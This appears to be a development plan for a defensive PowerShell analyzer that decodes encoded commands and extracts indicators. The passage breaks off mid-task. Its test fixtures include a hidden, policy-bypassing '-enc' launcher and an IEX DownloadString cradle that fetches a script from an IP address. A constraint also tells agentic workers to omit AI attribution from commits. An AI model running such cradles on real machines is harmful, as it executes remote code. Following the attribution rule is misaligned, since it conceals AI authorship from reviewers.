# PowerShell Analyzer — Phase 0+1 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship the shippable core of the PowerShell analyzer — paste a PowerShell command → deterministically decode it (Base64/UTF-16LE + gzip/raw-DEFLATE, depth 1) → extract IOCs → one-click each IOC into the existing reputation card — behind a new `/analyzer` route.

**Architecture:** A new pure-logic package `shared/analyzer/` (DOM-free, no I/O, same-input→same-output — mirrors `shared/verdict/`) exposes `analyze(input): Promise<AnalysisResult>`. A thin `web/src/routes/PowerShellAnalyzer.tsx` renders the result and wires each extracted IOC to `submitLookup()` (existing `/lookup` flow). Never executes the input.

**Tech Stack:** TypeScript, React 19, Vite, Tailwind v4, vitest (node env). Browser Web APIs: `atob`, `TextDecoder('utf-16le')`, `DecompressionStream` (`'gzip'`/`'deflate-raw'`). No new npm dependencies.

**Spec:** `docs/superpowers/specs/2026-08-19-powershell-analyzer-design.md` (read it — this plan implements Phases 0–1 of §13; Phases 2–5 are separate follow-up plans).

## Global Constraints

- **100% client-side, deterministic, never executes the input.** No `eval`/`new Function`/dynamic dispatch. CSP already forbids it (`script-src 'self'`, no `unsafe-eval`).
- **Pure logic in `shared/analyzer/`** — DOM-free, no network, no `Math.random`. Same input → same `AnalysisResult` (except `checkedAt`).
- **No AI/Claude attribution** in any commit, comment, or doc. Commits: `feat(analyzer): …`, author SaltyCarl.
- **No inline styles** (`react/forbid-dom-props` bans `style=`); Tailwind utility classes only. **No `data:` asset URIs** (`assetsInlineLimit:0`). **Reserved-colour law:** analyzer chips use periwinkle/neutral (`Chip variant="neutral"`), never red/amber/green.
- **Public sources only** — no employer/CARL knowledge in this repo.
- **Tests** live at `shared/analyzer/__tests__/*.test.ts` (auto-run by `web/vitest.config.ts`, which globs `../shared/**/*.test.ts`). Run from `web/`: `npm test` or `npx vitest run <path>`.
- A "fixed"/"passing" claim requires the actual command output — run the test and read it.

---

### Task 1: Types + package scaffold

**Files:**
- Create: `shared/analyzer/types.ts`
- Create: `shared/analyzer/report.ts`
- Create: `shared/analyzer/index.ts`
- Test: `shared/analyzer/__tests__/report.test.ts`

**Interfaces:**
- Produces: `AnalysisResult`, `DecodedLayer`, `ExtractedIoc`, `EvasionFlag`, `Signal`, `Characterization`, `ActionBullet`, `DecodeState`, `ConfidenceTier`, `Specificity` (types); `analyze(input: string): Promise<AnalysisResult>`.

- [ ] **Step 1: Write the failing test**

```ts
// shared/analyzer/__tests__/report.test.ts
import { describe, expect, it } from 'vitest'
import { analyze } from '../report'

describe('analyze (scaffold)', () => {
  it('returns a shaped AnalysisResult for empty input', async () => {
    const r = await analyze('')
    expect(r.input).toBe('')
    expect(r.flags).toEqual([])
    expect(r.layers).toEqual([])
    expect(r.iocs).toEqual([])
    expect(r.signals).toEqual([])
    expect(r.characterization).toBeNull()
    expect(r.bullets).toEqual([])
    expect(typeof r.copyText).toBe('string')
    expect(r.confidence.state).toBe('fully-decoded')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/report.test.ts`
Expected: FAIL — cannot find module `../report`.

- [ ] **Step 3: Write the types**

```ts
// shared/analyzer/types.ts
import type { IndicatorType } from '../indicators'

export type ConfidenceTier = 'resolved' | 'inferred' | 'opaque'
export type DecodeState = 'fully-decoded' | 'partial' | 'opaque' | 'wall'
export type Specificity = 'weak' | 'strong' | 'near-dispositive'

export interface EvasionFlag { flag: string; raw: string; techniqueIds: string[] }

export interface DecodedLayer {
  index: number
  transform: string
  text: string | null
  state: DecodeState
  residual?: { bytes: number; entropy: number; note: string }
}

export interface ExtractedIoc {
  raw: string
  defanged: string
  type: IndicatorType
  layerIndex: number
}

export interface Signal {
  id: string
  label: string
  techniqueIds: string[]
  specificity: Specificity
  trigger: string
}

export interface Characterization {
  level: 'high-confidence-malicious'
  basis: string[]
  read: string
}

export interface ActionBullet {
  order: number
  verb: string
  text: string
  confidence: ConfidenceTier
  iocs: string[]
  techniqueIds: string[]
}

export interface AnalysisResult {
  input: string
  flags: EvasionFlag[]
  layers: DecodedLayer[]
  iocs: ExtractedIoc[]
  signals: Signal[]
  characterization: Characterization | null
  bullets: ActionBullet[]
  confidence: { fractionAccounted: number; state: DecodeState }
  copyText: string
  checkedAt: string
}
```

- [ ] **Step 4: Write the minimal `analyze` stub + barrel**

```ts
// shared/analyzer/report.ts
import type { AnalysisResult } from './types'

export async function analyze(input: string): Promise<AnalysisResult> {
  return {
    input,
    flags: [],
    layers: [],
    iocs: [],
    signals: [],
    characterization: null,
    bullets: [],
    confidence: { fractionAccounted: 1, state: 'fully-decoded' },
    copyText: '',
    checkedAt: new Date().toISOString(),
  }
}
```

```ts
// shared/analyzer/index.ts
export { analyze } from './report'
export type * from './types'
```

- [ ] **Step 5: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/report.test.ts`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add shared/analyzer/types.ts shared/analyzer/report.ts shared/analyzer/index.ts shared/analyzer/__tests__/report.test.ts
git commit -m "feat(analyzer): scaffold shared/analyzer package + AnalysisResult types"
```

---

### Task 2: Lexer (string-literal-aware tokeniser)

The one property that matters here: extract string-literal *contents* correctly so later stages never mistake a backtick-escape or a quote for structure. Single-quoted = literal (no escapes); double-quoted = backtick escapes.

**Files:**
- Create: `shared/analyzer/lex.ts`
- Test: `shared/analyzer/__tests__/lex.test.ts`

**Interfaces:**
- Produces: `Token { type: 'string' | 'bareword' | 'punct'; value: string; raw: string; start: number; end: number }`; `tokenize(source: string): Token[]`; `stringLiterals(tokens: Token[]): string[]`.

- [ ] **Step 1: Write the failing test**

```ts
// shared/analyzer/__tests__/lex.test.ts
import { describe, expect, it } from 'vitest'
import { tokenize, stringLiterals } from '../lex'

describe('tokenize — literal safety', () => {
  it("single-quoted strings take no escapes (backtick is literal)", () => {
    const t = tokenize("$x = 'a`nb'")
    const s = t.find((tok) => tok.type === 'string')!
    expect(s.value).toBe('a`nb') // backtick + n stay literal inside single quotes
  })

  it('double-quoted strings resolve backtick escapes', () => {
    const t = tokenize('"a`nb`tc"')
    expect(t[0].type).toBe('string')
    expect(t[0].value).toBe('a\nb\tc') // `n → newline, `t → tab
  })

  it('a quote inside the other quote type is content, not a delimiter', () => {
    const t = tokenize(`'he said "hi"'`)
    expect(t[0].value).toBe('he said "hi"')
  })

  it('stringLiterals returns every literal payload in order', () => {
    const t = tokenize(`iwr 'http://a/x' ; IEX 'stuff'`)
    expect(stringLiterals(t)).toEqual(['http://a/x', 'stuff'])
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/lex.test.ts`
Expected: FAIL — cannot find module `../lex`.

- [ ] **Step 3: Write the lexer**

```ts
// shared/analyzer/lex.ts
export interface Token {
  type: 'string' | 'bareword' | 'punct'
  value: string // resolved content (for strings, the literal payload)
  raw: string   // exact source slice including quotes
  start: number
  end: number
}

const DQ_ESCAPES: Record<string, string> = { n: '\n', t: '\t', r: '\r', '0': '\0', a: '\x07', b: '\b', f: '\f', v: '\v' }
const PUNCT = new Set(['|', ';', '(', ')', '{', '}', '[', ']', ',', '='])

/** Lex PowerShell into a flat token stream. The ONLY correctness guarantee we
 *  rely on downstream: string-literal contents are extracted exactly, so a
 *  backtick-escape or an inner quote is never mistaken for structure. */
export function tokenize(source: string): Token[] {
  const out: Token[] = []
  let i = 0
  const n = source.length
  while (i < n) {
    const c = source[i]
    if (c === ' ' || c === '\t' || c === '\r' || c === '\n') { i++; continue }
    if (c === "'") { // single-quoted: literal; '' is an escaped quote
      const start = i; i++
      let v = ''
      while (i < n) {
        if (source[i] === "'") {
          if (source[i + 1] === "'") { v += "'"; i += 2; continue }
          i++; break
        }
        v += source[i]; i++
      }
      out.push({ type: 'string', value: v, raw: source.slice(start, i), start, end: i })
      continue
    }
    if (c === '"') { // double-quoted: backtick escapes; "" is an escaped quote
      const start = i; i++
      let v = ''
      while (i < n) {
        if (source[i] === '`' && i + 1 < n) { const e = source[i + 1]; v += DQ_ESCAPES[e] ?? e; i += 2; continue }
        if (source[i] === '"') {
          if (source[i + 1] === '"') { v += '"'; i += 2; continue }
          i++; break
        }
        v += source[i]; i++
      }
      out.push({ type: 'string', value: v, raw: source.slice(start, i), start, end: i })
      continue
    }
    if (PUNCT.has(c)) { out.push({ type: 'punct', value: c, raw: c, start: i, end: i + 1 }); i++; continue }
    // bareword: run until whitespace or punct or a quote (backtick escapes a char)
    const start = i
    let v = ''
    while (i < n) {
      const d = source[i]
      if (d === ' ' || d === '\t' || d === '\r' || d === '\n' || PUNCT.has(d) || d === "'" || d === '"') break
      if (d === '`' && i + 1 < n) { v += source[i + 1]; i += 2; continue } // outside strings: backtick = no-op escape
      v += d; i++
    }
    out.push({ type: 'bareword', value: v, raw: source.slice(start, i), start, end: i })
  }
  return out
}

/** Every string-literal payload, in source order. */
export function stringLiterals(tokens: Token[]): string[] {
  return tokens.filter((t) => t.type === 'string').map((t) => t.value)
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/lex.test.ts`
Expected: PASS (4 tests).

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/lex.ts shared/analyzer/__tests__/lex.test.ts
git commit -m "feat(analyzer): literal-safe PowerShell lexer"
```

---

### Task 3: Preprocess (strip the cmd wrapper + capture evasion flags)

**Files:**
- Create: `shared/analyzer/preprocess.ts`
- Test: `shared/analyzer/__tests__/preprocess.test.ts`

**Interfaces:**
- Consumes: nothing (operates on raw string).
- Produces: `preprocess(input: string): { script: string; encoded: string | null; flags: EvasionFlag[] }` — `encoded` is the Base64 payload of `-enc` when present; `script` is the input with the `powershell.exe …` wrapper removed.

- [ ] **Step 1: Write the failing test**

```ts
// shared/analyzer/__tests__/preprocess.test.ts
import { describe, expect, it } from 'vitest'
import { preprocess } from '../preprocess'

describe('preprocess', () => {
  it('captures -enc payload and the evasion flags (prefix-matched, case-insensitive)', () => {
    const r = preprocess('powershell.exe -NoP -W Hidden -Ep Bypass -enc AAAA')
    expect(r.encoded).toBe('AAAA')
    const flags = r.flags.map((f) => f.flag).sort()
    expect(flags).toEqual(['-enc', '-ep', '-nop', '-w'])
  })

  it('leaves a non-wrapped script alone', () => {
    const r = preprocess("IEX (New-Object Net.WebClient).DownloadString('http://a/x')")
    expect(r.encoded).toBeNull()
    expect(r.script).toContain('DownloadString')
    expect(r.flags).toEqual([])
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/preprocess.test.ts`
Expected: FAIL — cannot find module `../preprocess`.

- [ ] **Step 3: Write preprocess**

```ts
// shared/analyzer/preprocess.ts
import type { EvasionFlag } from './types'

// PowerShell accepts unambiguous prefixes of parameter names; match the ones
// that carry evasion meaning. Each entry: canonical flag → { regex, technique }.
const FLAG_RULES: { flag: string; re: RegExp; techniqueIds: string[] }[] = [
  { flag: '-enc', re: /(?:^|\s)-e(?:c|nc|ncodedcommand)?\s+([A-Za-z0-9+/=]{8,})/i, techniqueIds: ['T1027', 'T1140'] },
  { flag: '-nop', re: /(?:^|\s)-nop(?:rofile)?\b/i, techniqueIds: ['T1059.001'] },
  { flag: '-w', re: /(?:^|\s)-w(?:indowstyle)?\s+(?:hidden|h|1|minimized)\b/i, techniqueIds: ['T1564.003'] },
  { flag: '-ep', re: /(?:^|\s)-e(?:p|xec(?:utionpolicy)?)\s+(?:bypass|unrestricted)\b/i, techniqueIds: ['T1059.001'] },
  { flag: '-noni', re: /(?:^|\s)-noni(?:nteractive)?\b/i, techniqueIds: ['T1059.001'] },
  { flag: '-sta', re: /(?:^|\s)-sta\b/i, techniqueIds: ['T1059.001'] },
]

export function preprocess(input: string): { script: string; encoded: string | null; flags: EvasionFlag[] } {
  const flags: EvasionFlag[] = []
  let encoded: string | null = null
  for (const rule of FLAG_RULES) {
    const m = input.match(rule.re)
    if (!m) continue
    flags.push({ flag: rule.flag, raw: m[0].trim(), techniqueIds: rule.techniqueIds })
    if (rule.flag === '-enc' && m[1]) encoded = m[1]
  }
  // Strip a leading powershell(.exe)/pwsh invocation wrapper; keep the -Command body if present.
  let script = input.replace(/^\s*(?:["']?[^"'\s]*\b)?(?:powershell(?:\.exe)?|pwsh(?:\.exe)?)\b/i, '')
  const cmd = script.match(/-c(?:ommand)?\s+(.*)$/is)
  if (cmd) script = cmd[1]
  return { script: script.trim(), encoded, flags }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/preprocess.test.ts`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/preprocess.ts shared/analyzer/__tests__/preprocess.test.ts
git commit -m "feat(analyzer): preprocess — strip cmd wrapper, capture evasion flags + -enc payload"
```

---

### Task 4: Fold — Base64 + UTF-16LE (`-enc`)

**Files:**
- Create: `shared/analyzer/fold.ts`
- Test: `shared/analyzer/__tests__/fold.test.ts`

**Interfaces:**
- Produces: `fromBase64(b64: string): Uint8Array`; `decodeEnc(b64: string): string` (Base64 → UTF-16LE text); `looksBase64(s: string): boolean`.

- [ ] **Step 1: Write the failing test**

The fixture: `IEX 'hi'` encoded as PowerShell does it (`-EncodedCommand` = Base64 of the UTF-16LE bytes).

```ts
// shared/analyzer/__tests__/fold.test.ts
import { describe, expect, it } from 'vitest'
import { decodeEnc, looksBase64 } from '../fold'

// UTF-16LE bytes of "IEX 'hi'" → Base64. Precomputed so the test is deterministic.
const ENC = 'SQBFAFgAIAAnAGgAaQAnAA=='

describe('decodeEnc', () => {
  it('decodes a -EncodedCommand as Base64 → UTF-16LE (not UTF-8)', () => {
    expect(decodeEnc(ENC)).toBe("IEX 'hi'")
  })
  it('looksBase64 accepts the payload and rejects a URL', () => {
    expect(looksBase64(ENC)).toBe(true)
    expect(looksBase64('http://a/x')).toBe(false)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/fold.test.ts`
Expected: FAIL — cannot find module `../fold`.

- [ ] **Step 3: Write the decode primitives**

```ts
// shared/analyzer/fold.ts
export function fromBase64(b64: string): Uint8Array {
  const clean = b64.replace(/\s+/g, '')
  const bin = atob(clean)
  const out = new Uint8Array(bin.length)
  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i)
  return out
}

/** A -EncodedCommand payload is Base64 of UTF-16LE script text (the #1 gotcha:
 *  it is NOT UTF-8). */
export function decodeEnc(b64: string): string {
  return new TextDecoder('utf-16le').decode(fromBase64(b64))
}

const B64_RE = /^[A-Za-z0-9+/]+={0,2}$/
export function looksBase64(s: string): boolean {
  const t = s.replace(/\s+/g, '')
  return t.length >= 8 && t.length % 4 === 0 && B64_RE.test(t)
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/fold.test.ts`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/fold.ts shared/analyzer/__tests__/fold.test.ts
git commit -m "feat(analyzer): fold — Base64 + UTF-16LE -enc decode"
```

---

### Task 5: Fold — gzip / raw-DEFLATE memory-stream cradle

`DeflateStream` in PowerShell emits **raw** DEFLATE (no zlib header) → must use `DecompressionStream('deflate-raw')`, not `'deflate'`. Gzip is detected by magic bytes `1F 8B`.

**Files:**
- Modify: `shared/analyzer/fold.ts`
- Test: `shared/analyzer/__tests__/fold.test.ts` (add cases)

**Interfaces:**
- Produces: `inflate(bytes: Uint8Array): Promise<Uint8Array | null>` (auto-detects gzip vs raw-DEFLATE; returns `null` if neither decompresses); `bytesToText(bytes: Uint8Array): string`.

- [ ] **Step 1: Write the failing test**

Build the fixture at runtime with `CompressionStream` (the inverse of what we decode) so the test needs no precomputed blob.

```ts
// add to shared/analyzer/__tests__/fold.test.ts
import { inflate, bytesToText } from '../fold'

async function deflateRaw(text: string): Promise<Uint8Array> {
  const cs = new CompressionStream('deflate-raw')
  const stream = new Blob([new TextEncoder().encode(text)]).stream().pipeThrough(cs)
  return new Uint8Array(await new Response(stream).arrayBuffer())
}
async function gzip(text: string): Promise<Uint8Array> {
  const cs = new CompressionStream('gzip')
  const stream = new Blob([new TextEncoder().encode(text)]).stream().pipeThrough(cs)
  return new Uint8Array(await new Response(stream).arrayBuffer())
}

describe('inflate', () => {
  it('inflates a raw-DEFLATE blob (PowerShell DeflateStream)', async () => {
    const out = await inflate(await deflateRaw("IEX 'payload'"))
    expect(out).not.toBeNull()
    expect(bytesToText(out!)).toBe("IEX 'payload'")
  })
  it('inflates a gzip blob (detected by magic bytes)', async () => {
    const out = await inflate(await gzip('hello gzip'))
    expect(bytesToText(out!)).toBe('hello gzip')
  })
  it('returns null for non-compressed bytes', async () => {
    expect(await inflate(new TextEncoder().encode('not compressed'))).toBeNull()
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/fold.test.ts`
Expected: FAIL — `inflate` / `bytesToText` not exported.

- [ ] **Step 3: Add inflate + bytesToText to fold.ts**

```ts
// append to shared/analyzer/fold.ts
export function bytesToText(bytes: Uint8Array): string {
  return new TextDecoder('utf-8', { fatal: false }).decode(bytes)
}

async function decompress(bytes: Uint8Array, format: 'gzip' | 'deflate-raw'): Promise<Uint8Array | null> {
  try {
    const ds = new DecompressionStream(format)
    const stream = new Blob([bytes]).stream().pipeThrough(ds)
    return new Uint8Array(await new Response(stream).arrayBuffer())
  } catch {
    return null
  }
}

/** Inflate a gzip (magic 1F 8B) or raw-DEFLATE blob. Returns null if neither
 *  applies — PowerShell's DeflateStream is raw DEFLATE, so 'deflate-raw'. */
export async function inflate(bytes: Uint8Array): Promise<Uint8Array | null> {
  if (bytes.length >= 2 && bytes[0] === 0x1f && bytes[1] === 0x8b) {
    return decompress(bytes, 'gzip')
  }
  return decompress(bytes, 'deflate-raw')
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/fold.test.ts`
Expected: PASS (all fold cases).

Note: `DecompressionStream`/`CompressionStream`/`Blob.stream`/`Response` are Node ≥18 globals (the vitest env) and modern-browser globals. If a case throws "not defined", the Node version is <18 — record it against Spec §14 open-question 2 (browser-support floor) and stop.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/fold.ts shared/analyzer/__tests__/fold.test.ts
git commit -m "feat(analyzer): fold — gzip + raw-DEFLATE inflate"
```

---

### Task 6: Extract IOCs

Reuses the app's own indicator logic so the analyzer and the reputation card agree on what a valid indicator is.

**Files:**
- Create: `shared/analyzer/extract.ts`
- Test: `shared/analyzer/__tests__/extract.test.ts`

**Interfaces:**
- Consumes: `detectType` + `refang` from `../indicators`; `defang` from `../verdict/doctrine`.
- Produces: `extractIocs(layers: { index: number; text: string | null }[]): ExtractedIoc[]` — deduped by `raw`, carries `layerIndex` provenance.

- [ ] **Step 1: Write the failing test**

```ts
// shared/analyzer/__tests__/extract.test.ts
import { describe, expect, it } from 'vitest'
import { extractIocs } from '../extract'

describe('extractIocs', () => {
  it('pulls URLs + IPs from decoded text, defanged, with layer provenance', () => {
    const iocs = extractIocs([
      { index: 0, text: "IEX (iwr 'http://45.9.148.20/a.ps1')" },
      { index: 1, text: 'connect 185.220.101.42' },
    ])
    const raws = iocs.map((i) => i.raw)
    expect(raws).toContain('http://45.9.148.20/a.ps1')
    expect(raws).toContain('185.220.101.42')
    const url = iocs.find((i) => i.raw.startsWith('http'))!
    expect(url.type).toBe('url')
    expect(url.defanged).toBe('hxxp://45.9.148[.]20/a.ps1')
    expect(url.layerIndex).toBe(0)
  })

  it('dedupes an IOC that appears in multiple layers (keeps the first)', () => {
    const iocs = extractIocs([
      { index: 0, text: 'http://a.test/x' },
      { index: 1, text: 'http://a.test/x' },
    ])
    expect(iocs.filter((i) => i.raw === 'http://a.test/x')).toHaveLength(1)
    expect(iocs[0].layerIndex).toBe(0)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/extract.test.ts`
Expected: FAIL — cannot find module `../extract`.

- [ ] **Step 3: Write extract.ts**

```ts
// shared/analyzer/extract.ts
import type { ExtractedIoc } from './types'
import { detectType, refang } from '../indicators'
import { defang } from '../verdict/doctrine'

// Candidate substrings that might be indicators; detectType is the arbiter.
const CANDIDATE_RE = /\bhttps?:\/\/[^\s'"()<>]+|\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b|\b[a-z0-9](?:[a-z0-9-]*[a-z0-9])?(?:\.[a-z0-9-]+)+\b|\b[a-fA-F0-9]{32,64}\b/gi

/** Harvest IOCs from every decoded layer, deduped by raw value (first layer
 *  wins), typed by the app's own detectType so it agrees with /lookup. */
export function extractIocs(layers: { index: number; text: string | null }[]): ExtractedIoc[] {
  const seen = new Set<string>()
  const out: ExtractedIoc[] = []
  for (const layer of layers) {
    if (!layer.text) continue
    const matches = layer.text.match(CANDIDATE_RE) ?? []
    for (const m of matches) {
      const raw = refang(m).trim()
      if (!raw || seen.has(raw)) continue
      const type = detectType(raw)
      if (!type) continue
      seen.add(raw)
      out.push({ raw, defanged: defang(raw), type, layerIndex: layer.index })
    }
  }
  return out
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/extract.test.ts`
Expected: PASS. (If `defang` output differs, read the actual value from `shared/verdict/doctrine.ts:275` and align the expectation — the code is the source of truth.)

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/extract.ts shared/analyzer/__tests__/extract.test.ts
git commit -m "feat(analyzer): extract IOCs from decoded layers (deduped, typed, defanged)"
```

---

### Task 7: Report — wire the pipeline into `analyze()`

Depth-1 decode: preprocess → (if `-enc`) decode to layer 1 → detect an embedded Base64 blob and inflate it to layer 2 → extract IOCs across all layers → assemble `AnalysisResult` + a minimal `copyText`.

**Files:**
- Modify: `shared/analyzer/report.ts`
- Test: `shared/analyzer/__tests__/report.test.ts` (add end-to-end cases)

**Interfaces:**
- Consumes: `preprocess`, `decodeEnc`/`looksBase64`/`fromBase64`/`inflate`/`bytesToText` (fold), `stringLiterals`/`tokenize` (lex), `extractIocs` (extract).
- Produces: the full `analyze(input): Promise<AnalysisResult>` (Phase-1 fields: `flags`, `layers`, `iocs`, `confidence`, `copyText`).

- [ ] **Step 1: Write the failing test**

```ts
// add to shared/analyzer/__tests__/report.test.ts
describe('analyze — end to end (depth 1)', () => {
  const ENC = 'SQBFAFgAIAAnAGgAaQAnAA==' // "IEX 'hi'"

  it('decodes a -enc command into a layer and reports the flags', async () => {
    const r = await analyze(`powershell -nop -w hidden -enc ${ENC}`)
    expect(r.flags.map((f) => f.flag).sort()).toEqual(['-enc', '-nop', '-w'])
    expect(r.layers[0].transform).toMatch(/UTF-16LE/)
    expect(r.layers[0].text).toBe("IEX 'hi'")
    expect(r.layers[0].state).toBe('fully-decoded')
  })

  it('extracts a URL from a plain download cradle and defangs it in copyText', async () => {
    const r = await analyze("IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
    expect(r.iocs.map((i) => i.raw)).toContain('http://45.9.148.20/a.ps1')
    expect(r.copyText).toContain('hxxp://45.9.148[.]20/a.ps1')
    expect(r.copyText).toContain('NOT executed')
  })

  it('is deterministic (ignoring checkedAt)', async () => {
    const strip = (r: Awaited<ReturnType<typeof analyze>>) => ({ ...r, checkedAt: '' })
    expect(strip(await analyze(`-enc ${ENC}`))).toEqual(strip(await analyze(`-enc ${ENC}`)))
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/report.test.ts`
Expected: FAIL — layers empty / copyText empty.

- [ ] **Step 3: Implement the pipeline**

```ts
// shared/analyzer/report.ts  (replace the stub body)
import type { AnalysisResult, DecodedLayer } from './types'
import { preprocess } from './preprocess'
import { tokenize, stringLiterals } from './lex'
import { decodeEnc, looksBase64, fromBase64, inflate, bytesToText } from './fold'
import { extractIocs } from './extract'

export async function analyze(input: string): Promise<AnalysisResult> {
  const { script, encoded, flags } = preprocess(input)
  const layers: DecodedLayer[] = []

  // Layer 1: -enc Base64 → UTF-16LE.
  let current = script
  if (encoded) {
    const text = decodeEnc(encoded)
    layers.push({ index: layers.length, transform: 'Base64 → UTF-16LE', text, state: 'fully-decoded' })
    current = text
  }

  // Layer 2 (depth 1): an embedded Base64 blob that inflates (gzip/raw-DEFLATE cradle).
  for (const lit of stringLiterals(tokenize(current))) {
    if (!looksBase64(lit)) continue
    const inflated = await inflate(fromBase64(lit))
    if (inflated) {
      layers.push({ index: layers.length, transform: 'Base64 → inflate', text: bytesToText(inflated), state: 'fully-decoded' })
      break // depth 1: one inflate; deeper recursion is Phase 2
    }
  }

  // Layers to scan for IOCs: the decoded layers, or the raw script if nothing decoded.
  const scan = layers.length ? layers.map((l) => ({ index: l.index, text: l.text })) : [{ index: 0, text: current }]
  const iocs = extractIocs(scan)

  const state = layers.every((l) => l.state === 'fully-decoded') ? 'fully-decoded' : 'partial'
  const copyText = composeCopyText(input, layers, iocs)

  return {
    input,
    flags,
    layers,
    iocs,
    signals: [],
    characterization: null,
    bullets: [],
    confidence: { fractionAccounted: 1, state },
    copyText,
    checkedAt: new Date().toISOString(),
  }
}

function composeCopyText(input: string, layers: DecodedLayer[], iocs: AnalysisResult['iocs']): string {
  const lines: string[] = ['PowerShell static analysis — STATIC analysis, script was NOT executed', '']
  if (layers.length) {
    lines.push('Decoded layers:')
    layers.forEach((l) => lines.push(`  ${l.index + 1}. ${l.transform}`))
    lines.push('')
  }
  if (iocs.length) {
    lines.push('Indicators:')
    iocs.forEach((i) => lines.push(`  ${i.type.toUpperCase()}  ${i.defanged}`))
  } else {
    lines.push('Indicators: (none extracted)')
  }
  return lines.join('\n')
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd web && npx vitest run ../shared/analyzer`
Expected: PASS (all analyzer suites).

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/report.ts shared/analyzer/__tests__/report.test.ts
git commit -m "feat(analyzer): analyze() pipeline — depth-1 decode + IOC extraction + copyText"
```

---

### Task 8: `/analyzer` route + `usePsAnalysis` hook + nav

**Files:**
- Create: `web/src/routes/PowerShellAnalyzer.tsx`
- Create: `web/src/components/analyzer/usePsAnalysis.ts`
- Modify: `web/src/App.tsx` (add a `ROUTES` row — see `App.tsx:35-55`)
- Modify: `web/src/components/palette/commands.ts` (add a `DEFAULT_VIEWS` row — see `commands.ts:16-65`)

**Interfaces:**
- Consumes: `analyze` from `@socdesk/shared/analyzer`.
- Produces: `usePsAnalysis(input: string)` returning `{ kind: 'idle' } | { kind: 'analyzing' } | { kind: 'ok'; result: AnalysisResult } | { kind: 'error'; message: string }`; a default-exported/`Route`-mounted `PowerShellAnalyzer` component.

This task's gate is **build + lint + manual smoke** (the app's vitest env is node-only; UI components aren't unit-tested here — follow the existing route pattern in `web/src/routes/Lookup.tsx`).

- [ ] **Step 1: Write the hook**

```ts
// web/src/components/analyzer/usePsAnalysis.ts
import { useEffect, useState } from 'react'
import { analyze } from '@socdesk/shared/analyzer'
import type { AnalysisResult } from '@socdesk/shared/analyzer'

export type PsState =
  | { kind: 'idle' }
  | { kind: 'analyzing' }
  | { kind: 'ok'; result: AnalysisResult }
  | { kind: 'error'; message: string }

/** Runs the deterministic analyzer on the (debounced-by-caller) input. Guards
 *  against out-of-order completion — only the latest run updates state. */
export function usePsAnalysis(input: string): PsState {
  const [state, setState] = useState<PsState>({ kind: 'idle' })
  useEffect(() => {
    const q = input.trim()
    if (!q) { setState({ kind: 'idle' }); return }
    let live = true
    setState({ kind: 'analyzing' })
    analyze(q)
      .then((result) => { if (live) setState({ kind: 'ok', result }) })
      .catch((e) => { if (live) setState({ kind: 'error', message: e instanceof Error ? e.message : 'analysis failed' }) })
    return () => { live = false }
  }, [input])
  return state
}
```

- [ ] **Step 2: Write the route component**

Copy the header/frame idiom from `web/src/routes/Lookup.tsx` (a `ViewHeader` + a textarea input). Render is fleshed out in Task 9; for now render the input + a raw JSON dump so the route is verifiable.

```tsx
// web/src/routes/PowerShellAnalyzer.tsx
import { useState } from 'react'
import { usePsAnalysis } from '../components/analyzer/usePsAnalysis'

export function PowerShellAnalyzer() {
  const [input, setInput] = useState('')
  const state = usePsAnalysis(input)
  return (
    <div className="flex flex-col gap-4">
      <div className="flex flex-col gap-1">
        <span className="font-mono text-micro uppercase tracking-label text-faint">PowerShell analyzer</span>
        <h1 className="font-display text-xl font-bold text-paper">Paste a PowerShell command</h1>
        <p className="text-xs text-muted">Deterministic, client-side, never executed. Decodes it and extracts IOCs you can look up.</p>
      </div>
      <textarea
        value={input}
        onChange={(e) => setInput(e.target.value)}
        spellCheck={false}
        placeholder="powershell -nop -w hidden -enc …"
        className="min-h-28 w-full rounded-md border border-line bg-field p-3 font-mono text-xs text-paper placeholder:text-faint focus-visible:border-line-bright"
      />
      {state.kind === 'analyzing' && <p className="font-mono text-micro text-faint">Analyzing…</p>}
      {state.kind === 'error' && <p className="font-mono text-xs text-muted">Could not analyze: {state.message}</p>}
      {state.kind === 'ok' && (
        <pre className="overflow-x-auto rounded-md border border-line bg-panel p-3 font-mono text-micro text-muted">
          {JSON.stringify(state.result, null, 2)}
        </pre>
      )}
    </div>
  )
}
```

- [ ] **Step 3: Register the route + palette entry**

In `web/src/App.tsx`, import `PowerShellAnalyzer` and add to the `ROUTES` array (`App.tsx:35-55`), matching the existing row shape:

```tsx
